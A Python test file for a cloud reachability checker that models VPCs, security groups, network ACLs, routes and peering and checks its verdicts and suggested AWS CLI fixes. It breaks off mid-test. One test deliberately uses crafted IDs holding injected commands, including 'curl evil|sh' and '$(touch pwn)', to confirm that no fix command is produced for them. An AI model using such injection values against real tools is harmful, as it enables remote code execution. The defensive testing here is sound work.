"""Tests for Cloud Map reachability (cloud-map/mapreach.py), and the snapshot data it
needs: network ACL rules, and security groups and ports on load balancers and databases,
from the live scan (against moto) and from Terraform.

Run from the repo root:  python3 -m unittest tests.test_reachability -v
"""
import contextlib
import io
import json
import os
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))

TMP = tempfile.mkdtemp(prefix="awskit-test-")
os.environ.update({
    "AWS_ACCESS_KEY_ID": "testing", "AWS_SECRET_ACCESS_KEY": "testing",
    "AWS_SESSION_TOKEN": "testing", "AWS_DEFAULT_REGION": "us-east-1",
    "XDG_CONFIG_HOME": TMP, "AWS_CONFIG_FILE": os.path.join(TMP, "aws-config"),
    "AWS_SHARED_CREDENTIALS_FILE": os.path.join(TMP, "aws-credentials"),
})
# Nothing from the real environment may point the tests at a real account or endpoint.
for _name in ("AWS_PROFILE", "AWS_DEFAULT_PROFILE", "AWS_ENDPOINT_URL", "AWS_CA_BUNDLE",
              "AWS_ROLE_ARN", "AWS_WEB_IDENTITY_TOKEN_FILE", "AWS_CONTAINER_CREDENTIALS_FULL_URI",
              "AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"):
    os.environ.pop(_name, None)
for _name in [n for n in os.environ if n.startswith("AWS_ENDPOINT_URL_")]:
    os.environ.pop(_name, None)

from awskit import mapmodel as mm  # noqa: E402
from awskit import mapreach as reach  # noqa: E402

try:
    import boto3
    from moto import mock_aws
except ImportError:  # pragma: no cover
    mock_aws = None

EXAMPLES = ROOT / "cloud-map" / "examples"
ACCT = "111122223333"
DB = f"arn:aws:rds:us-east-1:{ACCT}:db:db1"
LB = f"arn:aws:elasticloadbalancing:us-east-1:{ACCT}:loadbalancer/app/web/0123456789abcdef"


def allow_all(rule=100):
    return [mm.nacl_entry(rule, eg, "allow", "-1", "0.0.0.0/0") for eg in (False, True)]


def base(source="aws"):
    """One VPC, 10.0.0.0/16: a public subnet with a web server and a NAT gateway, an app
    subnet with two app servers, and a database subnet with an RDS database. Every subnet
    in the default network ACL, which allows everything. Not finished, so a test can
    change it first."""
    snap = mm.Snapshot(source)
    mm.add_vpc(snap, "vpc-a", ACCT, "us-east-1", ["10.0.0.0/16"], "vpc-a")
    mm.add_subnet(snap, "subnet-pub", "vpc-a", "us-east-1a", "10.0.1.0/24", "public",
                  map_public=True)
    mm.add_subnet(snap, "subnet-app", "vpc-a", "us-east-1a", "10.0.11.0/24", "app")
    mm.add_subnet(snap, "subnet-db", "vpc-a", "us-east-1b", "10.0.12.0/24", "data")
    mm.add_gateway(snap, "igw", "igw-a", "vpc-a", name="igw-a")
    mm.add_nat(snap, "nat-a", "subnet-pub", "vpc-a", public_ip="54.0.0.1", state="available")
    mm.add_route_table(snap, "rtb-pub", "vpc-a", [{"dest": "10.0.0.0/16", "target": "local"},
                                                  {"dest": "0.0.0.0/0", "target": "igw-a"}],
                       ["subnet-pub"])
    mm.add_route_table(snap, "rtb-priv", "vpc-a", [{"dest": "10.0.0.0/16", "target": "local"},
                                                   {"dest": "0.0.0.0/0", "target": "nat-a"}],
                       ["subnet-app", "subnet-db"], main=True)
    mm.add_nacl(snap, "acl-default", "vpc-a", ["subnet-pub", "subnet-app", "subnet-db"], True,
                entries=allow_all() + mm.default_nacl_entries())
    everything = [mm.rule("-1", None, None, ["0.0.0.0/0"])]
    mm.add_security_group(snap, "sg-web", "vpc-a", "web", ingress=[
        mm.rule("tcp", 443, 443, ["0.0.0.0/0"])], egress=everything)
    mm.add_security_group(snap, "sg-app", "vpc-a", "app", ingress=[
        mm.rule("tcp", 8080, 8080, groups=["sg-web"])], egress=everything)
    mm.add_security_group(snap, "sg-db", "vpc-a", "db", ingress=[
        mm.rule("tcp", 5432, 5432, groups=["sg-app"])], egress=everything)
    mm.add_instance(snap, "i-web", "subnet-pub", "vpc-a", "web", private_ip="10.0.1.10",
                    public_ip="54.0.0.10", security_groups=["sg-web"])
    mm.add_instance(snap, "i-app", "subnet-app", "vpc-a", "app", private_ip="10.0.11.10",
                    security_groups=["sg-app"])
    mm.add_instance(snap, "i-app2", "subnet-app", "vpc-a", "app2", private_ip="10.0.11.11",
                    security_groups=["sg-app"])
    mm.add_rds(snap, DB, "db1", "vpc-a", ["subnet-db"], "us-east-1b", "postgres",
               security_groups=["sg-db"])
    return snap


def second_vpc(snap, region="us-east-1", cidr="10.1.0.0/16", vpc="vpc-b"):
    """Another VPC with one subnet and one host that allows tcp 5432 from vpc-a's app subnet."""
    mm.add_vpc(snap, vpc, ACCT, region, [cidr], vpc)
    net = cidr.split(".")
    sub = f"{net[0]}.{net[1]}.1.0/24"
    ip = f"{net[0]}.{net[1]}.1.10"
    mm.add_subnet(snap, f"subnet-{vpc}", vpc, region + "a", sub, f"{vpc}-sub")
    mm.add_route_table(snap, f"rtb-{vpc}", vpc, [{"dest": cidr, "target": "local"}],
                       [f"subnet-{vpc}"], main=True)
    mm.add_nacl(snap, f"acl-{vpc}", vpc, [f"subnet-{vpc}"], True,
                entries=allow_all() + mm.default_nacl_entries())
    mm.add_security_group(snap, f"sg-{vpc}", vpc, f"{vpc}-db", ingress=[
        mm.rule("tcp", 5432, 5432, ["10.0.11.0/24"])], egress=[mm.rule("-1", None, None, ["0.0.0.0/0"])])
    mm.add_instance(snap, f"i-{vpc}", f"subnet-{vpc}", vpc, f"{vpc}-host", private_ip=ip,
                    security_groups=[f"sg-{vpc}"])
    return f"i-{vpc}"


def done(snap):
    return mm.finish(snap)


def kinds(result):
    return [h.kind for h in result.hops]


def hop(result, kind, leg=None):
    for h in result.hops:
        if h.kind == kind and (leg is None or h.leg == leg):
            return h
    raise AssertionError(f"no {kind} hop in {kinds(result)}")


def set_rules(snap, sg_id, direction, rules):
    snap.get(sg_id).props[direction] = list(rules)


def own_acl(snap, acl_id, subnet, entries):
    """Move a subnet out of the default ACL into its own."""
    default = snap.get("acl-default")
    default.props["subnets"] = [s for s in default.props["subnets"] if s != subnet]
    mm.add_nacl(snap, acl_id, snap.get(subnet).props["vpc"], [subnet], entries=entries)


# =================================================================== inside one VPC

class SameVpcTests(unittest.TestCase):
    def test_same_subnet_skips_network_acls(self):
        snap = base()
        set_rules(snap, "sg-app", "ingress", [mm.rule("tcp", 8080, 8080, groups=["sg-app"])])
        # A network ACL that denies everything doesn't matter inside one subnet.
        own_acl(snap, "acl-app", "subnet-app", mm.default_nacl_entries())
        r = reach.check(done(snap), "app", "app2", "tcp", 8080)
        self.assertEqual(r.verdict, "reachable", reach.result_text(r))
        self.assertEqual(hop(r, "nacl").status, "skipped")
        self.assertIn("doesn't cross its network ACL", hop(r, "nacl").reason)
        self.assertNotIn("nacl-back-out", kinds(r))
        self.assertEqual(hop(r, "sg-in").status, "ok")
        self.assertIn("allows tcp 8080 from app (rule 1). app is in app.", hop(r, "sg-in").reason)

    def test_different_subnets_by_security_group_reference(self):
        r = reach.check(done(base()), "app", "db1", "tcp", 5432)
        self.assertEqual(r.verdict, "reachable", reach.result_text(r))
        self.assertFalse(r.partial)
        self.assertEqual(kinds(r), ["sg-out", "nacl-out", "route", "nacl-in", "sg-in", "service",
                                    "nacl-back-out", "nacl-back-in"])
        self.assertEqual([h.leg for h in r.hops][-2:], ["back", "back"])
        self.assertIn("Security group db allows tcp 5432 from app (rule 1). app is in app.",
                      hop(r, "sg-in").reason)
        self.assertIn("local", hop(r, "route").reason)
        for nid in ("i-app", "subnet-app", "sg-app", "acl-default", "rtb-priv", "subnet-db",
                    "sg-db", DB):
            self.assertIn(nid, r.path_nodes)
        self.assertEqual(r.path_nodes[0], "i-app")
        self.assertEqual(r.path_nodes[-1], DB)
        self.assertIn("sg-reference:sg-app->sg-db", r.path_edges)
        self.assertEqual(r.exit_code, 0)
        self.assertIn("as far as Cloud Map can tell", r.summary)
        json.dumps(r.as_dict())                       # all plain data

    def test_security_group_allows_by_cidr(self):
        snap = base()
        set_rules(snap, "sg-db", "ingress", [mm.rule("tcp", 5432, 5432, ["10.0.11.0/24"])])
        snap = done(snap)
        r = reach.check(snap, "app", "db1", "tcp", 5432)
        self.assertEqual(r.verdict, "reachable")
        self.assertIn("allows tcp 5432 from 10.0.11.0/24 (rule 1)", hop(r, "sg-in").reason)
        self.assertIn("covers 10.0.11.10", hop(r, "sg-in").reason)
        r = reach.check(snap, "web", "db1", "tcp", 5432)
        self.assertEqual(r.verdict, "blocked")

    def test_security_group_blocks_with_a_fix(self):
        r = reach.check(done(base()), "web", "db1", "tcp", 5432)
        self.assertEqual(r.verdict, "blocked")
        self.assertEqual(r.blocked_hop.kind, "sg-in")
        self.assertEqual(r.blocked_hop.node_id, "sg-db")
        self.assertIn("No inbound rule in security group db allows tcp 5432 from 10.0.1.10",
                      r.blocked_hop.reason)
        self.assertIn("tcp 5432 from app", r.blocked_hop.reason)           # what it does allow
        self.assertIn("aws ec2 authorize-security-group-ingress --group-id sg-db",
                      r.blocked_hop.fix)
        self.assertIn("GroupId=sg-web", r.blocked_hop.fix)
        self.assertEqual(r.exit_code, 3)
        self.assertIn("web can't reach db1 on tcp 5432", r.summary)

    def test_egress_rule_missing(self):
        snap = base()
        set_rules(snap, "sg-app", "egress", [mm.rule("tcp", 443, 443, ["0.0.0.0/0"])])
        r = reach.check(done(snap), "app", "db1", "tcp", 5432)
        self.assertEqual(r.verdict, "blocked")
        self.assertEqual(r.blocked_hop.kind, "sg-out")
        self.assertIn("No outbound rule", r.blocked_hop.reason)
        self.assertIn("authorize-security-group-egress", r.blocked_hop.fix)

    def test_stopped_instance(self):
        snap = base()
        snap.get("i-app").props["state"] = "stopped"
        r = reach.check(done(snap), "web", "app", "tcp", 8080)
        self.assertEqual(r.verdict, "blocked")
        self.assertEqual(kinds(r)[0], "state")
        self.assertIn("app is stopped, so it can't answer", r.blocked_hop.reason)

    def test_default_port(self):
        snap = base()
        mm.add_lb(snap, LB, "lb", "vpc-a", ["subnet-pub"], listeners=[
            {"port": 80, "protocol": "HTTP"}, {"port": 443, "protocol": "HTTPS"}])
        snap = done(snap)
        self.assertEqual(reach.default_port(reach.resolve(snap, "db1")), 5432)
        self.assertEqual(reach.default_port(reach.resolve(snap, "lb")), 443)
        self.assertIsNone(reach.default_port(reach.resolve(snap, "web")))

    def test_wrong_database_port(self):
        r = reach.check(done(base()), "app", "db1", "tcp", 3306)
        self.assertEqual(r.verdict, "blocked")
        self.assertIn("db1 listens on tcp 5432, not 3306", hop(r, "service").reason)

    def test_nacl_deny_at_a_lower_number_wins(self):
        snap = base()
        own_acl(snap, "acl-data", "subnet-db", [
            mm.nacl_entry(90, False, "deny", "tcp", "10.0.11.0/24", "", 5432, 5432),
            mm.nacl_entry(100, False, "allow", "-1", "0.0.0.0/0"),
            mm.nacl_entry(100, True, "allow", "-1", "0.0.0.0/0")] + mm.default_nacl_entries())
        r = reach.check(done(snap), "app", "db1", "tcp", 5432)
        self.assertEqual(r.verdict, "blocked")
        h = r.blocked_hop
        self.assertEqual((h.kind, h.node_id), ("nacl-in", "acl-data"))
        self.assertIn("denies tcp 5432 in from 10.0.11.10 at rule 90", h.reason)
        self.assertIn("create-network-acl-entry --network-acl-id acl-data --ingress --rule-number 89",
                      h.fix)

    def test_nacl_allow_before_a_deny_wins(self):
        snap = base()
        own_acl(snap, "acl-data", "subnet-db", [
            mm.nacl_entry(100, False, "allow", "-1", "0.0.0.0/0"),
            mm.nacl_entry(110, False, "deny", "tcp", "10.0.11.0/24", "", 5432, 5432),
            mm.nacl_entry(100, True, "allow", "-1", "0.0.0.0/0")] + mm.default_nacl_entries())
        r = reach.check(done(snap), "app", "db1", "tcp", 5432)
        self.assertEqual(r.verdict, "reachable", reach.result_text(r))
        self.assertIn("at rule 100", hop(r, "nacl-in").reason)

    def test_nacl_with_nothing_allowed_hits_the_default_rule(self):
        snap = base()
        own_acl(snap, "acl-data", "subnet-db", [
            mm.nacl_entry(100, False, "allow", "tcp", "10.0.0.0/16", "", 443, 443)] +
            allow_all()[1:] + mm.default_nacl_entries())
        r = reach.check(done(snap), "app", "db1", "tcp", 5432)
        self.assertEqual(r.blocked_hop.kind, "nacl-in")
        self.assertIn("so the default rule (*) denies it", r.blocked_hop.reason)

    def test_nacl_return_path_blocked_on_ephemeral_ports(self):
        snap = base()
        own_acl(snap, "acl-data", "subnet-db", [
            mm.nacl_entry(100, False, "allow", "-1", "0.0.0.0/0"),
            mm.nacl_entry(100, True, "allow", "tcp", "0.0.0.0/0", "", 443, 443)] +
            mm.default_nacl_entries())
        r = reach.check(done(snap), "app", "db1", "tcp", 5432)
        self.assertEqual(r.verdict, "blocked")
        h = r.blocked_hop
        self.assertEqual((h.kind, h.leg), ("nacl-back-out", "back"))
        self.assertIn("replies (tcp ports 1024-65535)", h.reason)
        self.assertIn("stateless", h.reason)
        self.assertEqual(hop(r, "nacl-in").status, "ok")      # the way there is fine
        self.assertTrue(any("1024-65535" in n for n in r.notes))

    def test_nacl_return_path_on_some_ephemeral_ports_depends_on_the_client(self):
        snap = base()
        own_acl(snap, "acl-data", "subnet-db", [
            mm.nacl_entry(100, False, "allow", "-1", "0.0.0.0/0"),
            mm.nacl_entry(100, True, "allow", "tcp", "0.0.0.0/0", "", 32768, 65535)] +
            mm.default_nacl_entries())
        r = reach.check(done(snap), "app", "db1", "tcp", 5432)
        self.assertEqual(r.verdict, "unknown", reach.result_text(r))
        h = hop(r, "nacl-back-out")
        self.assertEqual(h.status, "unknown")
        self.assertIn("only lets replies out to 10.0.11.10 on ports 32768-65535", h.reason)
        self.assertIn("1024-32767", h.reason)
        self.assertEqual(r.exit_code, 4)

    def test_more_specific_route_through_an_appliance_is_unknown(self):
        snap = base()
        mm.add_route(snap, "rtb-priv", "10.0.12.0/24", "eni-0firewall")
        r = reach.check(done(snap), "app", "db1", "tcp", 5432)
        self.assertEqual(r.verdict, "unknown")
        self.assertIn("more specific than the local route", hop(r, "route").reason)

    def test_old_snapshot_without_nacl_rules_is_unknown(self):
        snap = base()
        snap.get("acl-default").props.pop("entries")
        path = Path(TMP) / "old.cloudmap.json"
        done(snap).save(path)
        old = mm.Snapshot.load(path)
        r = reach.check(old, "app", "db1", "tcp", 5432)
        self.assertEqual(r.verdict, "unknown")
        h = hop(r, "nacl-out")
        self.assertEqual(h.status, "unknown")
        self.assertIn("network acl rules aren't in this snapshot (made before they were "
                      "recorded); rescan to check them", h.reason.lower())
        self.assertNotIn("Everything else on the way allows it", r.summary)  # several unknowns

    def test_old_snapshot_without_database_security_groups_is_unknown(self):
        snap = base()
        snap.get(DB).props.pop("security_groups")
        r = reach.check(done(snap), "app", "db1", "tcp", 5432)
        self.assertEqual(r.verdict, "unknown")
        self.assertIn("rescan", hop(r, "sg-in").reason)
        self.assertIn("Everything else on the way allows it", r.summary)

    def test_prefix_list_rule_is_unknown(self):
        snap = base()
        set_rules(snap, "sg-db", "ingress", [mm.rule("tcp", 5432, 5432, prefix_lists=["pl-0abc"])])
        r = reach.check(done(snap), "app", "db1", "tcp", 5432)
        self.assertEqual(r.verdict, "unknown")
        self.assertIn("pl-0abc", hop(r, "sg-in").reason)

    def test_rule_without_a_source_recorded_is_unknown(self):
        # Snapshots made before prefix lists were recorded have rules with no source.
        snap = base()
        set_rules(snap, "sg-db", "ingress", [mm.rule("tcp", 5432, 5432)])
        r = reach.check(done(snap), "app", "db1", "tcp", 5432)
        self.assertEqual(r.verdict, "unknown")
        self.assertIn("no source recorded", hop(r, "sg-in").reason)

    def test_fix_commands_leave_out_ids_that_arent_aws_ids(self):
        # A snapshot can be someone else's or hand-made: an ID that could break out of the
        # command (shell or AWS CLI shorthand characters) gets no command at all.
        snap = done(base())
        data = json.loads(snap.dumps())
        evil_sg, evil_ref, evil_acl = "sg-1;curl evil|sh", "sg-2}],IpRanges=[{CidrIp=0.0.0.0/0}", \
            "acl-x$(touch pwn)"
        names = {"sg-db": evil_sg, "sg-web": evil_ref, "acl-default": evil_acl}
        for n in data["nodes"]:
            n["id"] = names.get(n["id"], n["id"])
            p = n["props"]
            if isinstance(p.get("security_groups"), list):
                p["security_groups"] = [names.get(g, g) for g in p["security_groups"]]
            for direction in ("ingress", "egress"):
                for r in p.get(direction) or []:
                    r["groups"] = [names.get(g, g) for g in r.get("groups", [])]
            if n["id"] == evil_acl:
                p["entries"] = [e for e in p["entries"] if e["egress"] or e["rule"] != 100]
        crafted = mm.Snapshot.from_dict(data)
        r = reach.check(crafted, "web", "db1", "tcp", 5432)
        self.assertEqual(r.blocked_hop.kind, "nacl-in")
        self.assertTrue(all(h.fix == "" for h in r.hops), [h.fix for h in r.hops])
        crafted.get(evil_acl).props["entries"] = allow_all() + mm.default_nacl_entries()
        r = reach.check(crafted, "web", "db1", "tcp", 5432)
        self.assertEqual(r.blocked_hop.kind, "sg-in")
        self.assertEqual(r.blocked_hop.fix, "")
        # A real-looking group with an odd group on the other side: CIDRs, not the group.
        crafted.nodes["sg-0abc"] = crafted.nodes.pop(evil_sg)
        crafted.nodes["sg-0abc"].id = "sg-0abc"
        crafted.get(DB).props["security_groups"] = ["sg-0abc"]
        r = reach.check(crafted, "web", "db1", "tcp", 5432)
        self.assertIn("--group-id sg-0abc", r.blocked_hop.fix)
        self.assertIn("CidrIp=10.0.1.10/32", r.blocked_hop.fix)
        self.assertNotIn("IpRanges=[{CidrIp=0.0.0.0/0}", r.blocked_hop.fix)

    def test_damaged_snapshot_is_a_plain_error(self):
        for damage in ("rule", "entry", "sg-rule"):
            snap = done(base())
            data = json.loads(snap.dumps())
            for n in data["nodes"]:
                if n["id"] == "acl-default" and damage == "rule":
                    n["props"]["entries"][0]["rule"] = "abc"
                if n["id"] == "acl-default" and damage == "entry":
                    n["props"]["entries"].append("junk")
                if n["id"] == "sg-db" and damage == "sg-rule":
                    n["props"]["ingress"] = ["junk"]
            with self.assertRaisesRegex(reach.ReachError, "can't read"):
                reach.check(mm.Snapshot.from_dict(data), "app", "db1", "tcp", 5432)

    def test_more_rules_than_aws_allows_is_refused(self):
        snap = base()
        set_rules(snap, "sg-db", "ingress", [mm.rule("tcp", 5432, 5432, [f"10.{i // 250}.{i % 250}.0/24"])
                                             for i in range(reach.MAX_SG_RULES)])
        with self.assertRaisesRegex(reach.ReachError, "looks damaged"):
            reach.check(done(snap), "app", "db1", "tcp", 5432)
        snap = base()
        own_acl(snap, "acl-data", "subnet-db", [
            mm.nacl_entry(i + 1, False, "allow", "tcp", "10.0.0.0/16", "", i, i)
            for i in range(reach.MAX_ACL_RULES)] + mm.default_nacl_entries())
        with self.assertRaisesRegex(reach.ReachError, "looks damaged"):
            reach.check(done(snap), "app", "db1", "tcp", 5432)

    def test_terraform_without_network_acls_assumes_the_default(self):
        snap = base("terraform")
        snap.nodes.pop("acl-default")
        r = reach.check(done(snap), "app", "db1", "tcp", 5432)
        self.assertEqual(r.verdict, "reachable")
        self.assertTrue(any("default network ACL was assumed" in n for n in r.notes))
        # A live scan without network ACLs means they couldn't be read.
        snap = base("aws")
        snap.nodes.pop("acl-default")
        r = reach.check(done(snap), "app", "db1", "tcp", 5432)
        self.assertEqual(r.verdict, "unknown")
        self.assertIn("DescribeNetworkAcls", hop(r, "nacl-out").reason)


# =================================================================== ranges and protocols

class RangeTests(unittest.TestCase):
    def test_cidr_source_partly_allowed(self):
        snap = base()
        set_rules(snap, "sg-db", "ingress", [mm.rule("tcp", 5432, 5432, ["10.0.11.0/25"])])
        r = reach.check(done(snap), "10.0.11.0/24", "db1", "tcp", 5432)
        self.assertEqual(r.source.kind, "cidr")
        self.assertEqual(r.verdict, "blocked")
        self.assertTrue(r.partial)
        h = hop(r, "sg-in")
        self.assertTrue(h.partial)
        self.assertIn("only 10.0.11.0/25 of 10.0.11.0/24 is allowed", h.reason)
        self.assertIn("Only part of 10.0.11.0/24 can reach db1 on tcp 5432: 10.0.11.0/25", r.summary)
        self.assertEqual(hop(r, "sg-out").status, "skipped")          # a range has no group
        self.assertIn("Partly blocked", reach.result_text(r))
        self.assertIn("  partly    Security group db, inbound", reach.result_text(r))

    def test_partial_coverage_is_narrowed_by_every_check(self):
        snap = base()
        set_rules(snap, "sg-db", "ingress", [mm.rule("tcp", 5432, 5432, ["10.0.11.0/25"])])
        own_acl(snap, "acl-data", "subnet-db", [
            mm.nacl_entry(100, False, "allow", "-1", "10.0.11.0/26"),
            mm.nacl_entry(100, True, "allow", "-1", "0.0.0.0/0")] + mm.default_nacl_entries())
        r = reach.check(done(snap), "10.0.11.0/24", "db1", "tcp", 5432)
        self.assertTrue(r.partial)
        self.assertIn(": 10.0.11.0/26.", r.summary)
        # Two checks that each allow a different part: nothing gets through.
        snap = base()
        set_rules(snap, "sg-db", "ingress", [mm.rule("tcp", 5432, 5432, ["10.0.11.0/25"])])
        own_acl(snap, "acl-data", "subnet-db", [
            mm.nacl_entry(100, False, "allow", "-1", "10.0.11.128/25"),
            mm.nacl_entry(100, True, "allow", "-1", "0.0.0.0/0")] + mm.default_nacl_entries())
        r = reach.check(done(snap), "10.0.11.0/24", "db1", "tcp", 5432)
        self.assertEqual(r.verdict, "blocked")
        self.assertFalse(r.partial)

    def test_internet_partly_allowed(self):
        snap = base()
        set_rules(snap, "sg-web", "ingress", [mm.rule("tcp", 22, 22, ["203.0.113.0/24"])])
        snap = done(snap)
        r = reach.check(snap, "internet", "web", "tcp", 22)
        self.assertEqual(r.verdict, "blocked")
        self.assertTrue(r.partial)
        self.assertIn("Only part of the internet can reach web on tcp 22: 203.0.113.0/24", r.summary)
        r = reach.check(snap, "203.0.113.0/24", "web", "tcp", 22)
        self.assertEqual(r.source.kind, "internet")
        self.assertEqual(r.verdict, "reachable", reach.result_text(r))
        r = reach.check(snap, "203.0.113.7", "web", "tcp", 22)
        self.assertEqual(r.verdict, "reachable")
        r = reach.check(snap, "198.51.100.7", "web", "tcp", 22)
        self.assertEqual(r.verdict, "blocked")
        self.assertFalse(r.partial)

    def test_private_ranges_never_come_from_the_internet(self):
        # A network ACL that denies 10.0.0.0/8 before allowing everything still lets the
        # whole internet in, since nothing from the internet has a 10.x source.
        snap = base()
        own_acl(snap, "acl-pub", "subnet-pub", [
            mm.nacl_entry(90, False, "deny", "-1", "10.0.0.0/8"),
            mm.nacl_entry(100, False, "allow", "-1", "0.0.0.0/0"),
            mm.nacl_entry(100, True, "allow", "-1", "0.0.0.0/0")] + mm.default_nacl_entries())
        r = reach.check(done(snap), "internet", "web", "tcp", 443)
        self.assertEqual(r.verdict, "reachable", reach.result_text(r))

    def test_subnet_endpoint_has_no_security_group(self):
        snap = base()
        set_rules(snap, "sg-db", "ingress", [mm.rule("tcp", 5432, 5432, ["10.0.0.0/16"])])
        r = reach.check(done(snap), "subnet-app", "db1", "tcp", 5432)
        self.assertEqual(r.verdict, "reachable")
        self.assertEqual(hop(r, "sg-out").status, "skipped")
        self.assertIn("at the network level", r.summary)

    def test_subnet_against_a_group_rule_is_partly_blocked(self):
        r = reach.check(done(base()), "app", "db1", "tcp", 5432)
        self.assertEqual(r.verdict, "reachable")
        r = reach.check(done(base()), "subnet-app", "db1", "tcp", 5432)
        self.assertEqual(r.verdict, "blocked")
        self.assertTrue(r.partial)
        self.assertIn("only from hosts in security group app (sg-app)", hop(r, "sg-in").reason)

    def test_unknown_host_address_is_unknown(self):
        snap = base()
        set_rules(snap, "sg-db", "ingress", [mm.rule("tcp", 5432, 5432, ["10.0.0.0/16"])])
        r = reach.check(done(snap), "10.0.11.50", "db1", "tcp", 5432)
        self.assertEqual(r.source.kind, "address")
        self.assertEqual(r.verdict, "unknown")
        self.assertIn("No resource on the map has 10.0.11.50", hop(r, "sg-out").reason)

    def test_icmp_is_checked_as_ping(self):
        snap = base()
        set_rules(snap, "sg-app", "ingress", [mm.rule("icmp", 8, -1, ["10.0.1.0/24"])])
        r = reach.check(done(snap), "web", "app", "icmp", None)
        self.assertEqual(r.verdict, "reachable", reach.result_text(r))
        self.assertIsNone(r.port)
        self.assertIn("ping (ICMP echo)", r.summary)
        self.assertTrue(any("echo request" in n for n in r.notes))
        # Echo replies need their own network ACL rule on the way back.
        snap = base()
        set_rules(snap, "sg-app", "ingress", [mm.rule("icmp", -1, -1, ["10.0.1.0/24"])])
        own_acl(snap, "acl-app", "subnet-app", [
            mm.nacl_entry(100, False, "allow", "-1", "0.0.0.0/0"),
            mm.nacl_entry(100, True, "allow", "icmp", "0.0.0.0/0", icmp_type=8),
            mm.nacl_entry(110, True, "allow", "tcp", "0.0.0.0/0", "", 1024, 65535)] +
            mm.default_nacl_entries())
        r = reach.check(done(snap), "web", "app", "icmp", None)
        self.assertEqual(r.blocked_hop.kind, "nacl-back-out")
        self.assertIn("ping replies", r.blocked_hop.reason)

    def test_protocol_all(self):
        snap = base()
        r = reach.check(done(snap), "web", "app", "all", None)
        self.assertEqual(r.verdict, "blocked")                  # only tcp 8080 is allowed
        self.assertIn("only part of all traffic", hop(r, "sg-in").reason)
        snap = base()
        set_rules(snap, "sg-app", "ingress", [mm.rule("-1", None, None, groups=["sg-web"])])
        r = reach.check(done(snap), "web", "app", "all", 0)
        self.assertEqual(r.verdict, "reachable", reach.result_text(r))
        self.assertEqual(r.protocol, "all")
        self.assertIsNone(r.port)
        # A network ACL that denies one port before allowing everything blocks part of it.
        snap = base()
        set_rules(snap, "sg-app", "ingress", [mm.rule("-1", None, None, groups=["sg-web"])])
        own_acl(snap, "acl-app", "subnet-app", [
            mm.nacl_entry(50, False, "deny", "tcp", "0.0.0.0/0", "", 22, 22),
            mm.nacl_entry(100, False, "allow", "-1", "0.0.0.0/0"),
            mm.nacl_entry(100, True, "allow", "-1", "0.0.0.0/0")] + mm.default_nacl_entries())
        r = reach.check(done(snap), "web", "app", "all", None)
        self.assertEqual(r.verdict, "blocked")
        self.assertIn("only part of all traffic", hop(r, "nacl-in").reason)
        self.assertIn("rule 50", hop(r, "nacl-in").reason)

    def test_udp_rules_dont_allow_tcp(self):
        snap = base()
        set_rules(snap, "sg-db", "ingress", [mm.rule("udp", 5432, 5432, groups=["sg-app"]),
                                             mm.rule("6", 5000, 5500, ["10.0.11.10/32"])])
        snap = done(snap)
        r = reach.check(snap, "app", "db1", "tcp", 5432)
        self.assertEqual(r.verdict, "reachable")
        self.assertIn("tcp 5000-5500 from 10.0.11.10/32", hop(r, "sg-in").reason)
        r = reach.check(snap, "app2", "db1", "tcp", 5432)
        self.assertEqual(r.verdict, "blocked")


# =================================================================== between VPCs

class CrossVpcTests(unittest.TestCase):
    def peered(self, both=True, region="us-east-1"):
        snap = base()
        host = second_vpc(snap, region)
        mm.add_peering(snap, "pcx-1", "vpc-a", "vpc-b", "active")
        mm.add_route(snap, "rtb-priv", "10.1.0.0/16", "pcx-1")
        if both:
            mm.add_route(snap, "rtb-vpc-b", "10.0.0.0/16", "pcx-1")
        return snap, host

    def test_missing_route(self):
        snap = base()
        host = second_vpc(snap)
        r = reach.check(done(snap), "app", host, "tcp", 5432)
        self.assertEqual(r.verdict, "blocked")
        self.assertEqual(r.blocked_hop.kind, "route")
        self.assertIn("sends 0.0.0.0/0 to NAT gateway", r.blocked_hop.reason)
        self.assertIn("aren't reachable that way", r.blocked_hop.reason)
        snap = base()
        snap.get("rtb-priv").props["routes"] = [{"dest": "10.0.0.0/16", "target": "local"}]
        host = second_vpc(snap)
        r = reach.check(done(snap), "app", host, "tcp", 5432)
        self.assertIn("has no route for 10.1.1.10", r.blocked_hop.reason)

    def test_peering_both_ways(self):
        snap, host = self.peered()
        snap = done(snap)
        r = reach.check(snap, "app", host, "tcp", 5432)
        self.assertEqual(r.verdict, "reachable", reach.result_text(r))
        self.assertEqual(kinds(r), ["sg-out", "nacl-out", "route", "peering", "nacl-in", "sg-in",
                                    "nacl-back-out", "route-back", "nacl-back-in"])
        self.assertIn("peering connection pcx-1", hop(r, "route").reason)
        self.assertIn("connects vpc-a and vpc-b", hop(r, "peering").reason)
        self.assertIn("That's the way the traffic came", hop(r, "route-back").reason)
        self.assertIn("peering:vpc-a->vpc-b", r.path_edges)
        self.assertIn("route:subnet-app->vpc-b", r.path_edges)
        self.assertIn("rtb-vpc-b", r.path_nodes)

    def test_peering_one_way(self):
        snap, host = self.peered(both=False)
        r = reach.check(done(snap), "app", host, "tcp", 5432)
        self.assertEqual(r.verdict, "blocked")
        h = r.blocked_hop
        self.assertEqual((h.kind, h.leg), ("route-back", "back"))
        self.assertIn("has no route for 10.0.11.10. Replies need a route back through "
                      "peering connection pcx-1", h.reason)

    def test_security_group_reference_across_regions_doesnt_work(self):
        snap, host = self.peered(region="us-west-2")
        set_rules(snap, "sg-vpc-b", "ingress", [mm.rule("tcp", 5432, 5432, groups=["sg-app"])])
        r = reach.check(done(snap), "app", host, "tcp", 5432)
        self.assertEqual(r.verdict, "blocked")
        self.assertIn("don't work across a peering between regions", r.blocked_hop.reason)
        self.assertIn("across regions", hop(r, "peering").reason)
        # In the same region it works.
        snap, host = self.peered()
        set_rules(snap, "sg-vpc-b", "ingress", [mm.rule("tcp", 5432, 5432, groups=["sg-app"])])
        r = reach.check(done(snap), "app", host, "tcp", 5432)
        self.assertEqual(r.verdict, "reachable", reach.result_text(r))

    def test_peering_isnt_transitive(self):
        snap = base()
        second_vpc(snap, vpc="vpc-b")
        host_c = second_vpc(snap, cidr="10.2.0.0/16", vpc="vpc-c")
        mm.add_peering(snap, "pcx-ab", "vpc-a", "vpc-b", "active")
        mm.add_route(snap, "rtb-priv", "10.2.0.0/16", "pcx-ab")
        r = reach.check(done(snap), "app", host_c, "tcp", 5432)
        self.assertEqual(r.blocked_hop.kind, "peering")
        self.assertIn("isn't transitive", r.blocked_hop.reason)

    def test_overlapping_vpcs(self):
        snap = base()
        host = second_vpc(snap, cidr="10.0.0.0/16", vpc="vpc-b")
